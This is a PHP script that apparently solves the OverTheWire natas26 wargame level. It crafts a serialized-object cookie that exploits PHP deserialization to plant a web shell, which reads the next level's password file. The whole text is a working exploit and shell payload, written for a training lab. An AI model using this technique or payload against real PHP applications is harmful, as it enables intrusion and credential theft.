<?php

class Logger{
    public $logFile;
    public $initMsg;
    public $exitMsg;

    // We need a constructor to create an object, but it won't be called on the server
    function __construct(){}
}

// 1. Set the destination path for our shell. The img/ directory is writable.
$logFile = "img/shell2.php";

// 2. Set the content for our shell. This code will read the next password.
$exitMsg = "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";

// 3. Create a new Logger object
$o = new Logger();

// 4. Set the properties of the object directly.
// PHP will set these private properties from the serialized string.
$o->logFile = $logFile;
$o->exitMsg = $exitMsg;

// 5. The application expects an array of objects.
$drawing_array = array($o);

// 6. Serialize and encode the payload
$payload = base64_encode(serialize($drawing_array));

echo "Your payload is ready.\n";
echo "1. Set your 'drawing' cookie to the following value:\n";
echo $payload . "\n\n";
echo "2. After setting the cookie, refresh the page on natas26.\n";
echo "3. Finally, visit http://natas26.labs.overthewire.org/img/shell2.php to get the password.\n";

?>